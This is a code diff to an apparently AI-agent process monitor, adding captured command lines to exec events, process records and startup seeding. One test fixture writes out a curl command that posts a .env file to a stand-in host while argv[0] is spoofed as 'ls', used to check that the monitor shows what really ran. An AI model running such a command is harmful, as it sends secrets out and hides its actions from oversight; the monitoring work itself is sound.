@@ -18,8 +18,10 @@ use crate::classify::{
     errno_name, error, failed, is_exposed, is_external, is_sensitive_path, opens_for_write,
     ptrace_request,
 };
+use crate::cmdline::CommandLine;
 use crate::container::Container;
 use crate::enrich::EnrichedAddr;
+use crate::lineage::SeededProcess;
 
 /// Cap on unique keys per aggregate map (files, peers, unix sockets): a
 /// runaway crawler must not OOM the daemon. Existing keys keep updating.
@@ -71,6 +73,8 @@ pub struct Event {
 pub enum Payload {
     Execve {
         filename: String,
+        /// None for a failed exec, and where BTF lacks what it needs.
+        cmd_line: Option<Arc<CommandLine>>,
     },
     Open {
         filename: String,
@@ -140,7 +144,7 @@ impl Event {
     /// Filesystem paths this event names.
     pub fn paths(&self) -> impl Iterator<Item = &str> {
         let (a, b): (Option<&str>, Option<&str>) = match &self.payload {
-            Payload::Execve { filename }
+            Payload::Execve { filename, .. }
             | Payload::Open { filename, .. }
             | Payload::Unlink { filename, .. }
             | Payload::Chmod { filename, .. }
@@ -174,7 +178,12 @@ impl Event {
     pub fn describe(&self) -> String {
         let comm = &self.meta.comm;
         let mut s = match &self.payload {
-            Payload::Execve { filename } => format!("{comm} exec {filename}"),
+            Payload::Execve { filename, cmd_line } => {
+                match cmd_line.as_ref().map(|c| c.arguments()) {
+                    Some(args) if !args.is_empty() => format!("{comm} exec {filename} {args}"),
+                    _ => format!("{comm} exec {filename}"),
+                }
+            }
             Payload::Open { filename, .. } => format!("{comm} open {filename}"),
             Payload::Connect { addr } => format!("{comm} connect {addr}"),
             Payload::UnixConnect { path } => format!("{comm} connect unix:{path}"),
@@ -294,6 +303,8 @@ struct FileAgg {
 
 struct ProcessEntry {
     comm: Arc<str>,
+    /// Of its latest image.
+    cmd_line: Option<Arc<CommandLine>>,
     container: Option<Arc<Container>>,
     parent_pid: Option<u32>,
     running: bool,
@@ -311,6 +322,11 @@ impl ProcessEntry {
         proto::ProcessInfo {
             pid,
             comm: self.comm.to_string(),
+            cmd_line: self
+                .cmd_line
+                .as_ref()
+                .map(|c| c.to_string())
+                .unwrap_or_default(),
             parent_pid: self.parent_pid,
             running: self.running,
             file_count: self.file_count,
@@ -389,6 +405,7 @@ impl AgentTree {
             summary.running_count += 1;
             ProcessEntry {
                 comm: Arc::clone(comm),
+                cmd_line: None,
                 container: None,
                 parent_pid: None,
                 running: true,
@@ -457,11 +474,12 @@ impl AgentTree {
                 child.parent_pid = Some(meta.pid);
                 child.container = meta.container.clone();
             }
-            Payload::Execve { .. } => {
+            Payload::Execve { cmd_line, .. } => {
                 self.summary.exec_count += 1;
                 let entry = self.process(meta.pid, &meta.comm, ts);
                 if !failed(meta.ret) {
                     entry.comm = Arc::clone(&meta.comm);
+                    entry.cmd_line = cmd_line.clone();
                 }
                 entry.exec_count += 1;
             }
@@ -706,15 +724,18 @@ impl EventStore {
 
     /// Pre-populate a process entry from the /proc scan at startup, so
     /// processes that existed before k11 started have correct parent linkage.
-    pub fn seed_process(&mut self, root_pid: u32, pid: u32, parent_pid: Option<u32>, comm: &str) {
+    /// A process already running when its name became watched, as /proc
+    /// shows it.
+    pub fn seed_process(&mut self, p: &SeededProcess) {
         self.version += 1;
         let agent = self
             .agents
-            .entry(root_pid)
-            .or_insert_with(|| AgentTree::new(root_pid, comm));
+            .entry(p.root_pid)
+            .or_insert_with(|| AgentTree::new(p.root_pid, &p.comm));
         agent.version = self.version;
-        let entry = agent.process(pid, &Arc::from(comm), 0);
-        entry.parent_pid = parent_pid;
+        let entry = agent.process(p.pid, &Arc::from(p.comm.as_str()), 0);
+        entry.parent_pid = p.parent_pid;
+        entry.cmd_line = p.cmd_line.clone().map(Arc::new);
     }
 
     /// A `k11 run` session: `root_pid` is the k11 process that will spawn
@@ -850,6 +871,7 @@ mod tests {
             0,
             Payload::Execve {
                 filename: "/usr/bin/claude".into(),
+                cmd_line: None,
             },
         ));
         s
@@ -884,6 +906,33 @@ mod tests {
             .find(|p| p.pid == 200)
             .unwrap();
         assert_eq!(child.container.unwrap().runtime, "podman");
+    }
+
+    #[test]
+    fn an_exec_names_the_binary_then_the_arguments() {
+        let mut s = store();
+        let argv = b"ls\0-d\0@.env\0https://x.example/?a=b\0";
+        let exec = ev(
+            200,
+            "curl",
+            0,
+            Payload::Execve {
+                filename: "/usr/bin/curl".into(),
+                cmd_line: CommandLine::parse(argv, argv.len()).map(Arc::new),
+            },
+        );
+        // argv[0] said "ls"; the line says what ran.
+        assert_eq!(
+            exec.describe(),
+            "curl exec /usr/bin/curl -d @.env 'https://x.example/?a=b'"
+        );
+        s.push(exec);
+        let p = detail(&s, 0)
+            .processes
+            .into_iter()
+            .find(|p| p.pid == 200)
+            .unwrap();
+        assert_eq!(p.cmd_line, "ls -d @.env 'https://x.example/?a=b'");
     }
 
     #[test]
@@ -993,6 +1042,7 @@ mod tests {
             0,
             Payload::Execve {
                 filename: "/usr/bin/curl".into(),
+                cmd_line: None,
             },
         ));
         s.push(ev(
@@ -1001,6 +1051,7 @@ mod tests {
             -2,
             Payload::Execve {
                 filename: "/nope".into(),
+                cmd_line: None,
             },
         ));
         assert_eq!(summary(&s).running_count, 2);
